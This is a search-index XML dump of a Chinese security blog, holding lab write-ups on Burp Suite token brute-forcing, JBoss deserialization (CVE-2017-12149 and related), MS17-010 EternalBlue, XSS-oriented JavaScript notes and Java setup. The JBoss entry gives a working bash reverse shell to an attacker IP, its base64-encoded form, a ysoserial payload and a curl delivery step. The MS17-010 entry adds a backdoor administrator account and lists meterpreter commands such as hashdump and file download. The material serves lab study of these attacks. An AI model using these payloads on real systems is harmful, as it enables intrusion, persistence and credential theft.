<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Burpsuite绕过Token爆破</title>
    <url>/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Token是服务器端生成的、下发给客户端的、用来对客户端身份进行验证的一种令牌；若是Token不匹配，则不会进行身份验证。所以需要对Token进行识别匹配，从而使密码爆破能够顺利进行。</p>
<p>环境：</p>
<p>DVWA + Burpsuite Pro</p>
<h1 id="二、流程"><a href="#二、流程" class="headerlink" title="二、流程"></a>二、流程</h1><p>1、使用DVWA的高级模式，进入爆破模块，进行抓包，并发送到攻击器。</p>
<p>2、进行如下配置</p>
<p>Position模块 </p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703091039611.png" alt="image-20210703091039611" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703091039611.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">1：攻击模式选择Pitchfork，意为多对多，一一匹配。</span><br><span class="line">2、选定密码和token字段设置变量</span><br></pre>



<p>Paloads模块 – 1</p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703091434571.png" alt="image-20210703091434571" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703091434571.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">1：选定第一个变量（密码）</span><br><span class="line">2：攻击载荷选择简单列表</span><br><span class="line">3：选择从文件导入（这里做演示则随机添加了包含正确密码的若干密码）</span><br></pre>

<p>注意：1处需要配置第二个变量的密码模式（token），后续会对token配置，回头再回此设置。</p>
<p>Resource Pool模块</p>
<p>（注：这里是最新版的多线程模块，老版本应在Request Engine处）</p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703092057193.png" alt="image-20210703092057193" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703092057193.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">多线程设置为1，因为token是服务器端生成的验证令牌，无法多线程爆破（一次只有一个token生效）</span><br></pre>



<p>Option模块</p>
<p>选择Grep Extract模块</p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703092543186.png" alt="image-20210703092543186" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703092543186.png" class="lozad post-image"></p>
<p>点击Add，依次填写</p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703092442542.png" alt="image-20210703092442542" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703092442542.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">1：获取返回包内容</span><br><span class="line">2：匹配关键字token</span><br><span class="line">3：选定token值，自动生成匹配规则</span><br><span class="line">4：OK</span><br></pre>



<p>Redirections模块</p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703092804701.png" alt="image-20210703092804701" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703092804701.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">选定本次抓包的全部内容为重定向的范围（token在body的隐藏部分）</span><br></pre>



<p>最后，回到Payloads模块</p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703093340999.png" alt="image-20210703093340999" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703093340999.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">1：选定第二个变量</span><br><span class="line">2：选定payload类型--递归匹配（这里选完后自动加载了刚刚配置token的匹配规则--payload option部分）</span><br><span class="line">3：粘贴抓包部分的token值--需要给定初次抓包的匹配值</span><br><span class="line">4：配置完成，开始攻击</span><br></pre>



<p>3、结果</p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703093746103.png" alt="image-20210703093746103" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703093746103.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">可见token自动匹配，发包成功</span><br></pre>



<p>按照长度排序（状态码相同，无法参考）</p>
<p><img src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703093937504.png" alt="image-20210703093937504" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E7%BB%95%E8%BF%87Token%E7%88%86%E7%A0%B4/image-20210703093937504.png" class="lozad post-image"></p>
<p>在返回包的Render部分，可见DVWA爆破成功的界面。</p>
<p>至此，token绕过爆破攻击结束。</p>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>Token绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>JBoss反序列化漏洞复现</title>
    <url>/article/JBoss%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="1、确认漏洞及类型"><a href="#1、确认漏洞及类型" class="headerlink" title="1、确认漏洞及类型"></a>1、确认漏洞及类型</h1><p>在jboss的url后缀添加如下信息，根据回显确定漏洞版本</p>
<p>a、访问/invoker/readonly，返回500则说明存在漏洞-&gt;CVE-2017-12149</p>
<p>b、访问/jbossmq-httpil/HTTPServerILServlet，返回This is the JBossMQ HTTP-IL则存在漏洞-&gt;CVE-2017-7504</p>
<p>c、访问/invoker/EJBInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2013-4810</p>
<p>d、访问/invoker/JMXInvokerServlet,返回下载弹窗则存在漏洞-&gt;CVE-2015-7501</p>
<h1 id="2、制作payload"><a href="#2、制作payload" class="headerlink" title="2、制作payload"></a>2、制作payload</h1><p>工具：ysoserial.jar</p>
<p>靶机：192.168.66.140（Ubuntu_vulhub）</p>
<p>攻击机：192.168.66.138</p>
<h2 id="1、写反弹shell"><a href="#1、写反弹shell" class="headerlink" title="1、写反弹shell"></a>1、写反弹shell</h2><pre class="highlight"><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.66.138/1111 0&gt;&amp;1</span><br></pre>

<h2 id="2、bash64加密，勾选bash"><a href="#2、bash64加密，勾选bash" class="headerlink" title="2、bash64加密，勾选bash"></a>2、bash64加密，勾选bash</h2><p>（<a href="http://www.jackson-t.ca/runtime-exec-payloads.html%EF%BC%89">http://www.jackson-t.ca/runtime-exec-payloads.html）</a></p>
<pre class="highlight"><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre>

<h2 id="3、使用ysoserial-jar制作payload"><a href="#3、使用ysoserial-jar制作payload" class="headerlink" title="3、使用ysoserial.jar制作payload"></a>3、使用ysoserial.jar制作payload</h2><pre class="highlight"><span class="line">java -jar ysoserial.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjY2LjEzOC8xMTExIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; poc.ser</span><br></pre>

<p>注：<code>CommonsCollections有1-10，5及以后有效</code></p>
<h2 id="4、攻击机开启端口监听"><a href="#4、攻击机开启端口监听" class="headerlink" title="4、攻击机开启端口监听"></a>4、攻击机开启端口监听</h2><pre class="highlight"><span class="line">nc -lvp 1111</span><br></pre>

<h2 id="5、使用curl命令发送payload"><a href="#5、使用curl命令发送payload" class="headerlink" title="5、使用curl命令发送payload"></a>5、使用curl命令发送payload</h2><pre class="highlight"><span class="line">curl http:192.168.66.140:8080+试探目录 --data-binary @poc.ser</span><br></pre>

<p>注：poc版本&gt;=5</p>
<h2 id="6、成功反弹shell"><a href="#6、成功反弹shell" class="headerlink" title="6、成功反弹shell"></a>6、成功反弹shell</h2>]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>JBoss反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Java环境变量配置及切换</title>
    <url>/article/Java%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE%E5%8F%8A%E5%88%87%E6%8D%A2/</url>
    <content><![CDATA[<h2 id="java8环境配置"><a href="#java8环境配置" class="headerlink" title="java8环境配置"></a>java8环境配置</h2><p>1、控制面板&gt; 系统&gt; 高级系统设置&gt; 环境变量&gt; 系统变量</p>
<p>2、新建 JAVA_HOME</p>
<pre class="highlight"><span class="line">C:\Program Files\Java\jdk1.8.0_281		#根据具体路径更改</span><br></pre>

<p>3、新建 CLASSPATH</p>
<pre class="highlight"><span class="line">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</span><br></pre>

<p>4、修改 Path-新增</p>
<pre class="highlight"><span class="line">%JAVA_HOME%\bin;</span><br><span class="line">%JAVA_HOME%\jre\bin;</span><br></pre>

<p>注！环境变量path中，首行删除java自带的环境变量，否则自定义变量无法生效</p>
<pre class="highlight"><span class="line">C:\Program Files\Common Files\Oracle\Java\javapath</span><br></pre>

<p>删完后注意移动任意绝对路径至行首，否则path路径再次打开将以单行显示</p>
<h2 id="java11环境配置"><a href="#java11环境配置" class="headerlink" title="java11环境配置"></a>java11环境配置</h2><p>同上，无需修改</p>
<h2 id="Java版本切换"><a href="#Java版本切换" class="headerlink" title="Java版本切换"></a>Java版本切换</h2><p>1、新建JAVA8_HOME、JAVA11_HOME（JAVA_HOME已在上面新建）</p>
<p>2、新建java8.bat</p>
<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA8_HOME%&quot; /m</span><br></pre>

<p>3、新建java11.bat</p>
<pre class="highlight"><span class="line">setx JAVA_HOME &quot;%JAVA11_HOME%&quot; /m</span><br></pre>

<p>注：管理员权限运行</p>
]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Burpsuite挂梯子抓包</title>
    <url>/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>准备挂代理访问外网挖洞实战（另一点是准备挂代理挖国内src~）</p>
<p>然而挂了代理之后，bp就无法使用了。</p>
<h1 id="二、解决"><a href="#二、解决" class="headerlink" title="二、解决"></a>二、解决</h1><p><img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210709130332150.png" alt="image-20210709130332150.png" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210709130332150.png" class="lozad post-image"></p>
<p>1、Project options下，勾选Upstream Proxy Servers的override user option选项，出现3的输入框</p>
<p>2、点击Add</p>
<p> <img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210709130546321.png" alt="image-20210709130546321" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210709130546321.png" class="lozad post-image"></p>
<pre class="highlight"><span class="line">1：*全部</span><br><span class="line">2：127.0.0.1</span><br><span class="line">3：梯子的端口</span><br><span class="line">4：None</span><br><span class="line">OK</span><br></pre>

<p>3、配合bp原有的8080监听端口，打开梯子软件，可实现开启bp访问外网。</p>
<p>注：梯子需要选择全局代理，否则国内网站依旧是真实ip。</p>
<p>4、效果</p>
<p><img src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210709131053927.png" alt="image-20210709131053927" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/Burpsuite%E6%8C%82%E6%A2%AF%E5%AD%90%E6%8A%93%E5%8C%85/image-20210709131053927.png" class="lozad post-image"></p>
]]></content>
      <categories>
        <category>附加</category>
      </categories>
      <tags>
        <tag>Burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript基础</title>
    <url>/article/JavaScript%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="js调用方法（4种）"><a href="#js调用方法（4种）" class="headerlink" title="js调用方法（4种）"></a>js调用方法（4种）</h1><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><script>alert(1)</script></td>
<td>script标签中执行</td>
</tr>
<tr>
<td><script src="x.js"></script></td>
<td>调用执行</td>
</tr>
<tr>
<td><a href="javascript:alert(1)"></a></td>
<td>链接触发</td>
</tr>
<tr>
<td><p onclick="alert(1)"></p></td>
<td>事件触发</td>
</tr>
</tbody></table>
<h1 id="js事件"><a href="#js事件" class="headerlink" title="js事件"></a>js事件</h1><table>
<thead>
<tr>
<th>事件</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Windows事件</td>
<td>针对windows对象触发的事件，应用到body标签</td>
</tr>
<tr>
<td>onafterprint</td>
<td>打印之后触发的事件</td>
</tr>
<tr>
<td>onbeforeprint</td>
<td>打印之前触发的事件</td>
</tr>
<tr>
<td>onerror</td>
<td>发生错误（文件加载错误等）时触发的事件，常跟不存在的图片，用来执行js触发xss漏洞</td>
</tr>
<tr>
<td>onload</td>
<td>页面加载完成后立即发生</td>
</tr>
<tr>
<td>onresize</td>
<td>窗口大小被改变时触发的事件</td>
</tr>
<tr>
<td>onunload</td>
<td>页面下载或刷新网页时触发事件</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>Form事件</td>
<td>由HTML表单内的动作触发的事件，应用到几乎所有的HTML元素，最常用在Form元素</td>
</tr>
<tr>
<td>onblur</td>
<td>当元素失去焦点（鼠标移出等）时触发的事件</td>
</tr>
<tr>
<td>onchange</td>
<td>输入框的值发生变化或者下拉列表框选项触发的事件</td>
</tr>
<tr>
<td>onfocus</td>
<td>当元素获得焦点时触发的事件</td>
</tr>
<tr>
<td>onformchange</td>
<td>当表单被改变时触发的事件</td>
</tr>
<tr>
<td>oninput</td>
<td>当元素获得用户输入时触发的事件</td>
</tr>
<tr>
<td>onselect</td>
<td>元素中文本被选中后触发的事件</td>
</tr>
<tr>
<td>onsubmit</td>
<td>提交表单时触发的事件</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>Keyboard事件</td>
<td></td>
</tr>
<tr>
<td>onkeydown</td>
<td>用户按下按键时触发的事件</td>
</tr>
<tr>
<td>onkeypress</td>
<td>用户敲击按钮时触发的事件</td>
</tr>
<tr>
<td>onkeyup</td>
<td>用户释放按键时触发的事件</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>Mouse事件</td>
<td>由鼠标或类似用户动作触发的事件</td>
</tr>
<tr>
<td>onclick</td>
<td>元素上发生鼠标点击时触发的事件</td>
</tr>
<tr>
<td>ondblclick</td>
<td>元素上发生鼠标双击时触发的事件</td>
</tr>
<tr>
<td>onmousedown</td>
<td>当元素上按下鼠标按钮时触发的事件</td>
</tr>
<tr>
<td>onmousemove</td>
<td>当鼠标指针移动到元素上时触发的事件</td>
</tr>
<tr>
<td>onmouseover</td>
<td>当鼠标指针移动到元素上时触发的事件</td>
</tr>
<tr>
<td>onmouseout</td>
<td>当鼠标指针移出元素时触发的事件</td>
</tr>
<tr>
<td>onmouseup</td>
<td>当在元素上释放鼠标按钮时触发的事件</td>
</tr>
</tbody></table>
<p>更多事件访问文档：<a href="https://www.w3school.com.cn/tags/html_ref_eventattributes.asp">https://www.w3school.com.cn/tags/html_ref_eventattributes.asp</a></p>
<h1 id="DOM操作"><a href="#DOM操作" class="headerlink" title="DOM操作"></a>DOM操作</h1><table>
<thead>
<tr>
<th>使用</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>通过ID获取</td>
<td>document.getElementById()</td>
</tr>
<tr>
<td>通过标签名称获取（结果有多个，以数组形式存放）</td>
<td>docunment.getElementsByTagName()</td>
</tr>
<tr>
<td>通过对象名称获取（结果有多个，以数组形式存放）</td>
<td>documemt.getElementsByClassName()</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>document事件操作</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>动态添加事件</td>
<td>document.getElementById(“x”).addEventListener(“click”,function(){  })             <br>给img添加点击事件  <br>document.getElementById(“x”).addEventListener(“click”,function(){  alert(“这是图片”)  })</td>
</tr>
<tr>
<td>创建标签</td>
<td>document.createElement(“img”)                      #创建img标签  <br>创建img标签，并添加属性 <br> img =  document.createElement(“img”)   img.src =  “x.jpg”  img.style.width  = “100px”  …     <br>可以创建script标签实现跨站脚本攻击<br>  <img src="/article/JavaScript%E5%9F%BA%E7%A1%80/.%5CJavaScript%E5%9F%BA%E7%A1%80.assets%5C1.png" alt="1" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/JavaScript%E5%9F%BA%E7%A1%80/.%5CJavaScript%E5%9F%BA%E7%A1%80.assets%5C1.png" class="lozad post-image"></td>
</tr>
<tr>
<td>应用</td>
<td>document.body.appendChild()  执行添加/创建（否则不显示）</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>编程基础</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>MS17-010漏洞复现</title>
    <url>/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="一、简介："><a href="#一、简介：" class="headerlink" title="一、简介："></a>一、简介：</h1><p>MS17-010又称为永恒之蓝，通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞。目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
<h1 id="二、探测"><a href="#二、探测" class="headerlink" title="二、探测"></a>二、探测</h1><p>靶机：win7 x64 sp1 IP：192.168.66.98<br>攻击机：kali 2020.4 IP：192.168.66.138</p>
<h2 id="1、通过nmap扫描目标机器，发现139、445端口"><a href="#1、通过nmap扫描目标机器，发现139、445端口" class="headerlink" title="1、通过nmap扫描目标机器，发现139、445端口"></a>1、通过nmap扫描目标机器，发现139、445端口</h2><pre class="highlight"><span class="line">nmap -V -T4 192.168.66.98   </span><br><span class="line">#T4设置扫描速度，越高越快（1-5）</span><br><span class="line">#-V显示详情</span><br></pre>


<p>结果：</p>
<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.jpg" alt="1" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.jpg" class="lozad post-image"></p>
<h2 id="2、使用msf探测是否存在MS17-010漏洞"><a href="#2、使用msf探测是否存在MS17-010漏洞" class="headerlink" title="2、使用msf探测是否存在MS17-010漏洞"></a>2、使用msf探测是否存在MS17-010漏洞</h2><p>a、寻找MS17-010模块</p>
<pre class="highlight"><span class="line">search MS17-010</span><br></pre>

<p>发现2个探测模块和4个利用模块</p>
<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.jpg" alt="2" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.jpg" class="lozad post-image"></p>
<h2 id="3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测"><a href="#3、利用auxiliary-scanner-smb-smb-ms17-010探测模块进行漏洞探测" class="headerlink" title="3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测"></a>3、利用auxiliary/scanner/smb/smb_ms17_010探测模块进行漏洞探测</h2><pre class="highlight"><span class="line">use auxiliary/scanner/smb/smb_ms17_010   	#调用探测模块</span><br><span class="line">show options                 				#显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98          			#设置目标IP</span><br><span class="line">run                     					#运行探测程序</span><br></pre>

<p>探测出存在MS17-010漏洞</p>
<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.jpg" alt="3" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.jpg" class="lozad post-image"></p>
<h1 id="三、利用"><a href="#三、利用" class="headerlink" title="三、利用"></a>三、利用</h1><h2 id="1、使用攻击模块对靶机发起攻击"><a href="#1、使用攻击模块对靶机发起攻击" class="headerlink" title="1、使用攻击模块对靶机发起攻击"></a>1、使用攻击模块对靶机发起攻击</h2><pre class="highlight"><span class="line">use exploit/windows/smb/ms17_010_eternalblue    #调用攻击模块</span><br><span class="line">show options                                    #显示配置参数</span><br><span class="line">set RHOSTS 192.168.66.98                        #设置目标IP</span><br><span class="line">run                                             #运行探测程序</span><br></pre>


<p>攻击成功，进入后渗透攻击阶段</p>
<p><img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.jpg" alt="4" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.jpg" class="lozad post-image"></p>
<h2 id="2、靶机信息收集"><a href="#2、靶机信息收集" class="headerlink" title="2、靶机信息收集"></a>2、靶机信息收集</h2><p>a、查看目标主机详细信息</p>
<pre class="highlight"><span class="line">sysinfo</span><br></pre>

<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.jpg" alt="5" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.jpg" class="lozad post-image"></p>
<p>b、查看当前获取的权限</p>
<pre class="highlight"><span class="line">getuid</span><br></pre>

<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.jpg" alt="6" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.jpg" class="lozad post-image"></p>
<p>system权限，无需提权</p>
<h2 id="3、开启远程桌面"><a href="#3、开启远程桌面" class="headerlink" title="3、开启远程桌面"></a>3、开启远程桌面</h2><pre class="highlight"><span class="line">run getgui -e</span><br></pre>

<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.jpg" alt="7" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.jpg" class="lozad post-image"></p>
<p>成功开启远程桌面</p>
<h2 id="4、切换到cmd命令行模式"><a href="#4、切换到cmd命令行模式" class="headerlink" title="4、切换到cmd命令行模式"></a>4、切换到cmd命令行模式</h2><pre class="highlight"><span class="line">shell</span><br></pre>

<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.jpg" alt="8" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.jpg" class="lozad post-image"></p>
<h2 id="5、添加用户"><a href="#5、添加用户" class="headerlink" title="5、添加用户"></a>5、添加用户</h2><pre class="highlight"><span class="line">net user  </span><br></pre>

<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.jpg" alt="9" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.jpg" class="lozad post-image"></p>
<pre class="highlight"><span class="line">net user hacker hacker.123 /add        #添加用户、密码</span><br><span class="line"></span><br><span class="line">net localgroup administrators hacker /add  #提权至管理员组</span><br><span class="line"></span><br><span class="line">net localgroup administrators        #查看管理员组成员</span><br></pre>

<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.jpg" alt="10" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.jpg" class="lozad post-image"></p>
<p>提权成功</p>
<h2 id="6、开启远程桌面连接"><a href="#6、开启远程桌面连接" class="headerlink" title="6、开启远程桌面连接"></a>6、开启远程桌面连接</h2><p>a、win+r，输入mstsc调出远程桌面，输入账号密码进行远程桌面连接</p>
<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.jpg" alt="11" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.jpg" class="lozad post-image"></p>
<p>b、成功连接至靶机</p>
<p> <img src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.jpg" alt="12" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.jpg" class="lozad post-image"></p>
<p>至此，本次利用结束。后文附上meterpreter的其他指令，不做演示。</p>
<p>附录</p>
<pre class="highlight"><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下</span><br><span class="line">getpid              #查看当前Meterpreter Shell的进程</span><br><span class="line">PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run 